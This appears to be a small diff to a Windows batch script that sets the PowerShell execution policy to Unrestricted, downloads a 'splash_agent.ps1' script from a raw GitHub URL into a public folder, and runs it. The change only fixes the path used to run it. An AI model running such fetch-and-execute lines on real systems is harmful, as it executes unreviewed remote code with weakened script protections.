@@ -2,4 +2,4 @@ powershell Set-ExecutionPolicy -ExecutionPolicy Unrestricted
 timeout /t 5
 powershell Invoke-WebRequest -Uri https://raw.githubusercontent.com/jamsub/splash/main/splash_agent.ps1 -OutFile C:\users\public\splash_agent.ps1
 timeout /t 15
-powershell .\splash_agent.ps1
+powershell C:\users\public\splash_agent.ps1
